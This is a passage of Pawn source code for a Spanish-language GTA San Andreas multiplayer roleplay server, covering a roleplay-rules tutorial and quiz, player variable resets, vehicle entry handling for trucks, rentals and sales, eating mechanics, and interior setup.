	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"A continuacion un ejemplo de ~r~DM");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Hay un hombre hablando por telefono. Tu, tienes ganas de golpear cualquiera que veas, vas y");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"le pegas. en la realidad, no harias eso, golpear una persona cuesta mas que tocar click muchas veces");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"Ademas no tienes razon alguna para golpea este pobre hombre. ¡Eso no lo haces en la vida real!");
		}
		case 8:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~r~Incorrecto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Si hace esto, el Staff tomara medidas dependiendo de la gravedad");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"del caso.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 9:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Eres un pandillero, vas con cuatro amigos tuyos, cuando vez un policía sin armas");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"que anteriormente te detubo.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 10:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~g~Correcto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"El rol lo justifica, en la realidad eso sucederia");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1]," ");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 11:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"PowerGaming (PG)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"El concepto denominado PowerGaming hace referencia a \"Jugador Superpoderoso\"");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Este, es cuando haces algo, que en la realidad no harias, o cosas que son imposibles");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"de hacer, más allá que el GTA:SA te lo permita.");
		}
		case 12:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Ejemplo de pg");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Vas a la comisaria, donde hay muchos agentes caminando por la oficina.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Hay un tipo con un celular. vas, sacas un arma y le gritas: ~r~¡DAME EL CELULAR!");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"Todos los policias te rodean con arma y tu, sales corriendo como si nada.");
		}
		case 13:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~r~Incorrecto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"¡En la realidad, no haces eso! Si robas, te aseguras que no haya policias.");
		 	PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"y, en caso que un policia te apunte con un arma, lo primero que haces es");
		 	PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"¡rendirse y con las manos en alto! (Usar /rendirse)");
		}
		case 14:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~g~correcto:");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Primero que nada, nunca robarias en ese caso, pero si tu personaje");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"teiene problemas psicologicos, el rol justifica dicha acción.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 15:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~g~Correcto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"En caso que te apunten, levantas las manos y pides disculpas");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1]," ");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 16:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"In character (IC)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"IC, es todo lo que tu personaje aprende dentro del juego, es decir roleando");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Por ejemplo, algo IC seria, aunque sepas el nombre de la persona porque lo ves arriba");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"de su cabeza, le preguntas al sujeto: ~g~Disculpa, ¿Cómo te llamas?");
		}
		case 17:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Out of character (OOC)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"OOC, es todo lo que tu sabes, y tu personaje aún no lo conoce, por ejemplo");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Un amigo te dice por Skype que el está en la comisaria, pero tu personaje no sabe");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"que el está en la comisaria. Eso, es información OOC");
		}
		case 18:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"MetaGaming (MG)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"MeteGaming, es utilizar información OOC en IC, para propio beneficio");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Por ejemplo, pasas a buscar a aquel amigo que te dijo por Skype que estaba");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"en la comisaria, sin enterarte IC de la situación.");
		}
		case 19:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"~r~Incorrecto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Te has informado de su posición por un medio OOC, ¡tu personaje no sabe eso!");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"");
	    	PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"");
		}
		case 20:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"BunnyHop (BH)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Es cuando tu jugador se cansa de correr, y vas presionando ~p~CTRL");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"y saltas, saltas, porque llegas mas rapido. En la realidad, te cansarias el doble");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"Si vas saltando, asique no se debe hacer.");
		}
		case 21:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"RevengeKill (RK)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Es cuando te matan roleando, sin DM por supuesto, y tu por venganza vas y te vengas.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Esto esta mal, ya que cuendo mueres supuestamente pierdes la memoria");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 22:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"TeamKill (TK)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Es cuando matas a un miembro de tu trabajo o faccion, esto");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"es AntiRol, ya que en la realidad no matas miembros de tu equipo.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 23:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"ZigZag (ZZ)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Es cuando alguien te dispara para matarte y/o herirte, y tu");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"te mueves para todos lados para que no te pege.Esto, tambien es muy AntiRol");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"ya que es imposible esquivar las balas.");
		}
		case 24:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"CarJacked (CJ)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Se denomina CJ a cuando alguien roba un auto sin rol,simplemente tocando ~p~INTRO");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"A menos que estes escapando de la policia, o alguna emergencia esto esta mal!");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"");
		}
		case 25:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Fin del tutorial");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Ojala que haya prestado mucha atencion, ahora es momento");
			PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"de demostrar lo aprendido, a continuacion el ~b~test de rol.");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2]," ");
		}
		case 26:
		{
		    CamaraAleatoria(playerid);

			LimpiarPantalla(playerid,10);
			TextDrawHideForPlayer(playerid, BOXTuto[0]);
			TextDrawHideForPlayer(playerid, BOXTuto[1]);
			PlayerTextDrawHide(playerid, TituloTuto[playerid]);
			PlayerTextDrawHide(playerid, InfoTuto[playerid][0]);
			PlayerTextDrawHide(playerid, InfoTuto[playerid][1]);
			PlayerTextDrawHide(playerid, InfoTuto[playerid][2]);
			TogglePlayerControllable(playerid,false);
			SetPVarInt(playerid,"ParteConceptos",0);
			SetPVarInt(playerid,"ParteTest",1);
			Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"¿Qué es ROLEAR? "#CINFO"(1/5)",""#CINFO"1) "#CBLANCO"Rolear, es utilizar la información OOC en el juego\n"#CINFO"2) "#CBLANCO"Rolear, es actuar lo máximo posible como en la vida real\n"#CINFO"3) "#CBLANCO"Rolear, es hacerte responsable al prestar la cuenta.\n","Aceptar","Tutorial");
			return 1;
		}
  	}
	SetPVarInt(playerid,"ParteConceptos", GetPVarInt(playerid,"ParteConceptos")+1 );
  	return 1;
}


// ---====] Resetear variables [====---- //

stock ResetearVariables(playerid)
{
	foreach(Vehicle, i)
		Bit_Set(Llave_veh[playerid], i, false);

	Bit_Set(AnimsLocked, playerid, false);

    Loop(i, sizeof(TrabajosPorHora[]), 0)
    {
		TrabajosPorHora[playerid][i] = 0;
	}

	Loop(i, MAX_TIMERS, 0)
	{
		KillTimer2(playerid,i);
	}

	Loop(i, MAX_PCP, 0)
	{
 		DestroyPCP(playerid, i);
	}

	if(RangoADM[playerid] != Text3D:INVALID_3DTEXT_ID)
	{
		Delete3DTextLabel(RangoADM[playerid]);
		RangoADM[playerid] = Text3D:INVALID_3DTEXT_ID;
	}

	if(Enmascarado[playerid] != Text3D:INVALID_3DTEXT_ID)
	{
		Delete3DTextLabel(Enmascarado[playerid]);
		Enmascarado[playerid] = Text3D:INVALID_3DTEXT_ID;
	}

	if(_:TituloTuto[playerid] != INVALID_TEXT_DRAW)
	    TituloTuto[playerid] = PlayerText:INVALID_TEXT_DRAW;

	if(NumberPanel[playerid][0] != PlayerText:0)
	{
	    for(new a; a < MAX_KEY_NUMBERS; a++)
		{
		    NumberPanel[playerid][a] = PlayerText:0;
		}
	}

    TrailerAttached[playerid] = 0;
	UsandoHackPad[playerid] = 0;
	CurrentObject[playerid] = 0;
	OBJ_Bomba[playerid] = INVALID_OBJECT_ID;
	Specteado_Por[playerid] = INVALID_PLAYER_ID;
	Specteando_ID[playerid] = INVALID_PLAYER_ID;
	BigEars[playerid] = false;
	Loop(i, MAX_MUEBLES_CASA, 0)
	{
		OBJ_Mueble[playerid][i] = INVALID_OBJECT_ID;
	}
	CasaActual[playerid] = INVALID_HOUSE_ID;
	TextoCarcel[playerid] = PlayerText3D:INVALID_3DTEXT_ID;
	
	return 1;
}

stock ResetearVariablesEx(playerid)
{
	Loop(i, sizeof(InfoJugador[]), 0)
	{
	    InfoJugador[playerid][InfoJ:i] = 0;
	}

	Loop(i, sizeof(InfoJugadorTemp[]), 0)
	{
	    InfoJugadorTemp[playerid][InfoJ:i] = 0;
	}

	return 1;
}

CALLBACK: CaminarPelear(playerid)
{
	switch(InfoJugador[playerid][jPelea])
	{
		case 1:   SetPlayerFightingStyle(playerid,FIGHT_STYLE_NORMAL);
		case 2:   SetPlayerFightingStyle(playerid,FIGHT_STYLE_KUNGFU);
		case 3:   SetPlayerFightingStyle(playerid,FIGHT_STYLE_KNEEHEAD);
	}
	switch(InfoJugador[playerid][jEstilo])
	{
		case 1:  SetPlayerWalkingStyle(playerid,WALK_NORMAL);
		case 2:  SetPlayerWalkingStyle(playerid,WALK_GANGSTA);
		case 3:  SetPlayerWalkingStyle(playerid,WALK_GANGSTA2);
		case 4:  SetPlayerWalkingStyle(playerid,WALK_OLD);
		case 5:  SetPlayerWalkingStyle(playerid,WALK_FAT_OLD);
		case 6:  SetPlayerWalkingStyle(playerid,WALK_FAT);
		case 7:  SetPlayerWalkingStyle(playerid,WALK_LADY);
		case 8:  SetPlayerWalkingStyle(playerid,WALK_LADY2);
		case 9:  SetPlayerWalkingStyle(playerid,WALK_WHORE);
		case 10: SetPlayerWalkingStyle(playerid,WALK_WHORE2);
		case 11: SetPlayerWalkingStyle(playerid,WALK_DRUNK);
		case 12: SetPlayerWalkingStyle(playerid,WALK_BLIND);
	}
	return 1;
}


stock alm(string[],string2[])
{
	strmid(string,string2,0,strlen(string2),strlen(string2)+1);
	return 1;
}

CALLBACK: RealSpawn(playerid)
{
	SetPVarInt(playerid,"_SPAWNEO",1);
}


public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(GetPVarInt(playerid,"LIC_Segundos"))
    {
        return 1;
	}

	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    SpecSync(playerid, 1);
	    new
			VehID = GetPlayerVehicleID(playerid);

		switch(GetVehType(VehID))
		{
		    case VEHICLE_TYPE_CAR, VEHICLE_TYPE_AIRCRAFT:
		    {
				switch(Veh[VehID][vRadio])
				{
				    case RADIO_LSTV:
						PlayAudioStreamForPlayer(playerid, RadioLSTV);

					case RADIO_REGGAE:
				        PlayAudioStreamForPlayer(playerid, URL_REGGAE);

					case RADIO_RAP:
				        PlayAudioStreamForPlayer(playerid, URL_RAP);

				}
			}
		}
	}
	else if(newstate == PLAYER_STATE_DRIVER)
	{
	    SpecSync(playerid, 1);
	    new
			VehID = GetPlayerVehicleID(playerid);

		new
		    TrailerID = GetVehicleTrailer(VehID);

		if(TrailerID)
		{
		    TrailerAttached[playerid] = TrailerID;
		}

		switch(GetVehType(VehID))
		{
			case VEHICLE_TYPE_BICYCLE:
			{
			    EncenderMotor(VehID);
			}
		    case VEHICLE_TYPE_CAR, VEHICLE_TYPE_AIRCRAFT:
		    {
				switch(Veh[VehID][vRadio])
				{
				    case RADIO_LSTV:
						PlayAudioStreamForPlayer(playerid, RadioLSTV);

					case RADIO_REGGAE:
				        PlayAudioStreamForPlayer(playerid, URL_REGGAE);

					case RADIO_RAP:
				        PlayAudioStreamForPlayer(playerid, URL_RAP);

				}
				
	 			if(!InfoJugador[playerid][jLicenciaAuto])
					Mensaje(playerid,-1,"¡No tienes licencia para conducir un vehículo! Saca una en el centro de licencias");
			}
			case VEHICLE_TYPE_BIKE:
			{
			    if(!InfoJugador[playerid][jLicenciaMoto])
					Mensaje(playerid,-1,"¡No tienes licencia para conducir una moto! Saca una en el centro de licencias");
			}
		}
		if(!Veh[VehID][vMotor])
		{
  			Mensaje(playerid,C_INFO,"> "#CBLANCO"Presione '~k~~VEHICLE_FIREWEAPON~' para encender este vehículo.");
			SetProgressBarValue(BMotor[playerid], 1.0);
		}
		if(Veh[VehID][vTrabajo] == ID_Camionero)
		{
		    new
		        Model = GetVehicleModel(VehID);

			if(strlen(InfoCamion[VehID][camChofer]) > 3)
			{
			    if(Model != 515)
			    {
					MensajeF(playerid,-1,""#CINFO"[CAMIÓN DE CARGA] "#CBLANCO"Chofer: "#CINFO"%s "#CBLANCO"| Carga: "#CINFO"%s",InfoCamion[VehID][camChofer],NombreCarga(InfoCamion[VehID][camCarga]));

					if(GetPVarInt(playerid,"Chofer_Camion") == VehID)
					{
						CheckpointEntrega(playerid);
					}
					else
					{
					    Error(playerid,"¡No eres el chofer de este camión!");
						RemovePlayerFromVehicle(playerid);
					}
				}
				else
				{
					MensajeF(playerid,-1,""#CINFO"[CAMIÓN DE CARGA] "#CBLANCO"Chofer: "#CINFO"%s "#CBLANCO"| Carga: "#CINFO"%s",InfoCamion[VehID][camChofer],NombreCarga(InfoCamion[VehID][camCarga]));

					if(GetPVarInt(playerid,"Chofer_Camion") != VehID)
					{
					    Error(playerid,"¡No eres el chofer de este camión!");
						RemovePlayerFromVehicle(playerid);
						return 1;
					}
				}
				return 1;
			}
			else
			{
			    if(Model != 515)
			    {
			        if(GetPVarInt(playerid, "Chofer_Camion"))
			        {
			            Error(playerid, "Ya estás usando un camión.");
			            RemovePlayerFromVehicle(playerid);
			            return 1;
					}

				    Mensaje(playerid,-1,""#CINFO"[CAMIÓN DE CARGA] "#CBLANCO"Chofer: "#CINFO"Nadie "#CBLANCO"| Carga: "#CINFO"Nada");
				    Mensaje(playerid,-1,"Si quiere transportar productos en este camión, dirijase al "#CROJO"punto rojo en el mapa.");
					SetPlayerCP(playerid,CP_CAMIONERO,2640.8167,-2139.0896,13.5469,8);
					SetPVarInt(playerid,"PasoEntrega",0);
				}
				else
				{
					if(InfoJugador[playerid][jTrabajo] != ID_Camionero || InfoJugador[playerid][jNivelTrabajo] < 2)
					{
					    RemovePlayerFromVehicle(playerid);
					    return Error(playerid, "¡No eres nivel dos de camionero!");
					}
				    Mensaje(playerid,-1,""#CINFO"[CAMIÓN DE CARGA] "#CBLANCO"Chofer: "#CINFO"Nadie "#CBLANCO"| Carga: "#CINFO"Nada");
					Error(playerid,"Dirigete a una ~y~fabrica ~w~para buscar la carga.");
					SetPlayerMapIcon(playerid, MI_FABRICA_COMIDA, -1018.6302, -647.0596, 36.2578, 0, C_AMARILLO, MAPICON_GLOBAL);
					SetPlayerMapIcon(playerid, MI_FABRICA_GRANO, 2518.8049, 2772.9048, 12.6953, 0, C_AMARILLO, MAPICON_GLOBAL);
					SetPlayerMapIcon(playerid, MI_FABRICA_TIERRA, 274.8940 ,1410.4055, 12.1626, 0, C_AMARILLO, MAPICON_GLOBAL);
					SetPVarInt(playerid,"PasoEntrega",2);
					SetPVarInt(playerid,"NivelCamionero", 2);
				}
				return 1;
			}
		}
	    if(EsVehRenta(VehID))
	    {
	    	if(VehRentado[VehID] == 0)
	    	{
	    	    new
					RS[300];

	    	    format(RS,sizeof(RS),""#CBLANCO"Puedes rentar este "#CPOSITIVO"Vehículo:\n"#CBLANCO"________________________________\n\n  "#CAZULCLARO"•"#CBLANCO"Precio: "#CAZULCLARO"$"#PRECIO_VEHRENTA"\n  •"#CBLANCO"Modelo: "#CPOSITIVO""#CAZULCLARO"%s\n"#CBLANCO"________________________________",NombreVehiculo(VehID));
	        	ShowPlayerDialog(playerid,dVehRenta,DIALOG_STYLE_MSGBOX,""#CBLANCO"Vehiculo para "#CPOSITIVO"rentar",RS,"Rentar","Salir");
			}
			else if(VehRentado[VehID] == 1 && GetPVarInt(playerid,"RentoVehID") != VehID)
			{
				RemovePlayerFromVehicle(playerid);
				Error(playerid,"¡Ya alguien ha rentado este vehículo!");
				return 1;
			}
			else if(VehRentado[VehID] == 1 && GetPVarInt(playerid,"RentoVehID") == VehID){}
		}

  		if(VGas[VehID] < 1.0)
		{
			ApagarMotor(VehID);
			Mensaje(playerid,-1,"Este vehículo no tiene combustible.");
		}

		// Vehiculos de venta
		new
		    VentaID = VehVenta_ID(VehID);

		if(VentaID)
		{
			if(!strmatch(InfoVeh[VentaID][vComprador], "Sin Dueño"))
			{
			    new Str[80];
			    A_Format(Str,"Este vehículo, pertenece a "#CAZULRARO"%s",InfoVeh[VentaID][vComprador]);
				Mensaje(playerid,-1,Str);
			}
			if(TieneLlaveVeh(playerid,VehID) && !EsDuenoVeh(playerid,VentaID))
			{
			    Mensaje(playerid,-1,"Puedes usar este vehículo por pertenecer a la familia del dueño");
			}
			if(strmatch(InfoVeh[VentaID][vComprador], "Sin Dueño"))
			{
	    	    new
					VS[400],
					InfoTamano[140];

	    	    new
					Float:X,
					Float:Y,
					Float:Z;

	    	    GetVehicleModelInfo(GetVehicleModel(VehID),VEHICLE_MODEL_INFO_SIZE, X, Y, Z);

				format(InfoTamano,sizeof(InfoTamano),"  •"#CBLANCO"Ancho: "#CAZULCLARO"%.1fM\n  •"#CBLANCO"Largo: "#CAZULCLARO"%.1fM\n  •"#CBLANCO"Alto: "#CAZULCLARO"%.1fM",X,Y,Z);

	    	    if(InfoVeh[VehVenta_ID(VehID)][vUsado] == true)
				{
					format(VS,sizeof(VS),""#CBLANCO"Puedes adquirir este "#CPOSITIVO"Vehículo:\n"#CBLANCO"________________________________\n\n  "#CAZULCLARO"•"#CBLANCO"Precio: "#CAZULCLARO"$%d\n  •"#CBLANCO"Modelo: "#CAZULCLARO"%s\n  •"#CBLANCO"Dist. recorrida: "#CAZULCLARO"%.0fKM\n%s\n"#CBLANCO"________________________________\n\nUtilice "#CPOSITIVO"/comprar vehiculo",InfoVeh[VehVenta_ID(VehID)][vPrecio],NombreVehiculo(VehID),InfoVeh[VehVenta_ID(VehID)][vMetros]/1000,InfoTamano);
					ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CAZUL"Vehiculo "#CBLANCO"usado",VS,"Aceptar","");
				}
				else if(InfoVeh[VehVenta_ID(VehID)][vUsado] == false)
				{
	    	    	format(VS,sizeof(VS),""#CBLANCO"Puedes adquirir este "#CPOSITIVO"Vehículo:\n"#CBLANCO"________________________________\n\n  "#CAZULCLARO"•"#CBLANCO"Precio: "#CAZULCLARO"$%d\n  •"#CBLANCO"Modelo: "#CPOSITIVO""#CAZULCLARO"%s\n%s\n"#CBLANCO"________________________________\n\nUtilice "#CPOSITIVO"/comprar vehiculo",InfoVeh[VehVenta_ID(VehID)][vPrecio],NombreVehiculo(VehID),InfoTamano);
					ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CAZUL"Vehiculo "#CBLANCO"0KM",VS,"Aceptar","");
				}
			}
		}
		return 1;
	}

	else if(newstate == PLAYER_STATE_ONFOOT)
	{
	    SpecSync(playerid, 0);
		StopAudioStreamForPlayer(playerid);
	    TrailerAttached[playerid] = 0;
 		if(EsCosechador(playerid))
		{
			if(GetPVarInt(playerid,"EstaCultivando") > 0)
			{
				HideProgressBarForPlayer(playerid,BCosecha[playerid]);
			}
		}
	}

	if (newstate != PLAYER_STATE_DRIVER && newstate != PLAYER_STATE_PASSENGER)
	{
 		SacarVelocimetro(playerid);
	}

	return 1;
}

stock SpecSync(playerid, type)
{
	if(type == 0) //Onfoot
	{
	    if(Specteado_Por[playerid] != INVALID_PLAYER_ID)
	    {
	        PlayerSpectatePlayer(Specteado_Por[playerid], playerid);
		}
	}
	else if(type == 1) //Vehicle
	{
	    if(Specteado_Por[playerid] != INVALID_PLAYER_ID)
	    {
	        PlayerSpectateVehicle(Specteado_Por[playerid], GetPlayerVehicleID(playerid) );
		}
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	if(VehVenta_ID(vehicleid))
	{
		InfoVeh[VehVenta_ID(vehicleid)][vColor1] = color1;
		InfoVeh[VehVenta_ID(vehicleid)][vColor2] = color2;

		ActualizarVehiculo(VehVenta_ID(vehicleid));
		#if LOG_CHAT == true
		printf("vehículo ID %i: Cambiado el color por: %i - %i", VehVenta_ID(vehicleid), color1, color2);
  		#endif
  		
  		if(playerid != INVALID_PLAYER_ID)
			UpdatePlayerVehicleTD(playerid);
			
	}
	return 1;
}


public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	if(VehVenta_ID(vehicleid))
	{
	    InfoVeh[VehVenta_ID(vehicleid)][vPintadoJ] = paintjobid;

	    ActualizarVehiculo(VehVenta_ID(vehicleid));
		#if LOG_CHAT == true
		printf("vehículo ID %i: se le ha cambiado el paintjob a: %i", VehVenta_ID(vehicleid), paintjobid);
  		#endif
	}
	return 1;
}

CALLBACK: _RemovePlayerAttachedObject(playerid, index) return RemovePlayerAttachedObject(playerid,index);


CALLBACK: Comer(playerid, comida, Float:Hambre, precio,bool:comiendo)
{
	if(comiendo)
	{
		if(GetTickCount() - GetPVarInt(playerid,"T_COMIENDO") < 10000)
		{
		    SetTimerEx("Comer",3000, false, "iifii", playerid, comida, Hambre, precio, true);

		    if(!IsPlayerInAnyVehicle(playerid))
		    {
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
			}
		}
		return 1;
	}
	if(precio > GetPlayerMoney(playerid))
	{
	    return Error(playerid,"¡Dinero insuficiente!");
	}
	QuitarDinero(playerid, precio);
	if(ID_Negocio(playerid)) InfoNegocio[ID_Negocio(playerid)][nDinero] += precio;
	if(GetTickCount() - GetPVarInt(playerid,"ULTIMA_COMIDA") < 60000)
	{
	    SetPVarInt(playerid,"COMIDAS_COUNT", GetPVarInt(playerid,"COMIDAS_COUNT")+1);
	    if(GetPVarInt(playerid,"COMIDAS_COUNT") > 4)
	    {
	        cmd_vomitar(playerid, "" );
	        InfoJugador[playerid][jHambre] = 15.0;
			SetProgressBarValue(BHambre[playerid], InfoJugador[playerid][jHambre]);
			UpdateProgressBar(BHambre[playerid],playerid);
			return 1;
		}
	}
	SetPVarInt(playerid, "ULTIMA_COMIDA", GetTickCount() );
	InfoJugador[playerid][jHambre] += Hambre;
	if(InfoJugador[playerid][jHambre] > 100.0) InfoJugador[playerid][jHambre] = 100.0;
	SetProgressBarValue(BHambre[playerid], InfoJugador[playerid][jHambre]);
	UpdateProgressBar(BHambre[playerid], playerid);
	ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
	switch(comida)
	{
	    case 0:
	    {
			SetPlayerAttachedObject(playerid, SLOT_OBJECTS, 2881,  6,0.128999,0.161000,0.130999,163.399993,-136.800033,-0.200000,1.000000,1.000000,1.000000);
			SetTimerEx("_RemovePlayerAttachedObject",10000,false,"ii", playerid, SLOT_OBJECTS );
		}
		case 1:
		{
			SetPlayerAttachedObject(playerid, SLOT_OBJECTS, 2880,  6,0.128999,0.161000,0.130999,163.399993,-136.800033,-0.200000,1.000000,1.000000,1.000000);
			SetTimerEx("_RemovePlayerAttachedObject",10000,false,"ii", playerid, SLOT_OBJECTS );
		}//2898 id objeto copado pasto verde
	}
	SetPVarInt(playerid,"T_COMIENDO",GetTickCount());
 	SetTimerEx("Comer",3000, false, "iifii", playerid, comida, Hambre, precio, true);
	return 1;
}


// - Interiores

stock CargarInteriores()
{
	#pragma tabsize 0

	/*Aeropuerto: */CrearInterior("Aeropuerto",5,1451.309,-2287.064,13.546,451.697,-1911.701,0.361,1061.143,358.737,2);
	/*Policía: */CrearInterior("Policía",10,1554.751,-1675.486,16.195,447.712,246.586,107.790,1003.218,359.719,2);
	/*Ejército: */CrearInterior("Ejército",1,2729.416,-2451.032,17.593,275.207,285.634,-41.146,1001.515,353.382,0);
	/*Hospital: */CrearInterior("Hospital",3,1172.475,-1323.386,15.403,263.329,2605.117,1326.002,866.376,90.569,4);
	/*Banco: */CrearInterior("Banco",9,1481.411,-1774.309,15.346,358.317,184.179,-130.914,999.632,0.000,3);
	/*Centro de Licencias: */CrearInterior("Centro de Licencias",3,1153.944,-1772.282,16.599,361.384,-2027.064,-104.276,1035.171,183.015,2);
	/*Ascensor: */CrearInterior("Ascensor",0,474.623,-1519.610,20.390,276.653,470.714,-1515.760,40.572,167.727,5);
	/*Estudio de grabación: */CrearInterior("Estudio de grabación",5,732.786,-1349.066,13.508,272.797,1280.364,-832.648,1044.965,89.080,4);
	/*Televisión: */CrearInterior("Televisión",1,649.008,-1357.221,13.567,448.834,-1977.085,594.592,1055.585,0.228,3);
	/*Grotti: */CrearInterior("Grotti",17,563.988,-1293.556,17.248,354.951,-962.341,1934.683,28.923,292.730,2);
	/*Casa Blanca: */CrearInterior("Casa Blanca",3,1122.706,-2037.003,69.894,269.658,390.172,173.764,1008.382,86.677,3);
	/*Hitman: */CrearInterior("Hitman",3,284.749,-1509.821,24.921,236.277,367.892,162.551,1014.189,90.359,4);
	/*Juzgado: */CrearInterior("Juzgado",6,1411.853,-1699.812,13.539,233.823,829.915,123.488,981.485,179.263,4);
	/*Mina de Huntle Charry: */CrearInterior("Mina de Huntle Charry",1,698.602,894.941,-38.713,450.236,-41.399,-1784.365,743.997,0.000,3);
	/*Puesto de fundición de mineral: */CrearInterior("Puesto de fundición de mineral",2,-1844.215,-9.493,15.117,267.326,265.480,-96.512,1001.517,356.958,3);

	#pragma tabsize 4
	return 1;
}

stock CrearInterior(const nombre_int[], interiorid, Float:x, Float:y, Float:z, Float:Angle1, Float:x1, Float:y1, Float:z1, Float:Angle2, Freeze)
{
	static i;

	i++;

	if(i >= MAX_INTERIORES-1)
	    return printf("[Error] Se debe incrementar MAX_INTERIORES;");

	InfoInterior[i][intEntrada_x] = x;
	InfoInterior[i][intEntrada_y] = y;
	InfoInterior[i][intEntrada_z] = z;
	InfoInterior[i][intEntrada_a] = Angle1;

	InfoInterior[i][intSalida_x] = x1;
	InfoInterior[i][intSalida_y] = y1;
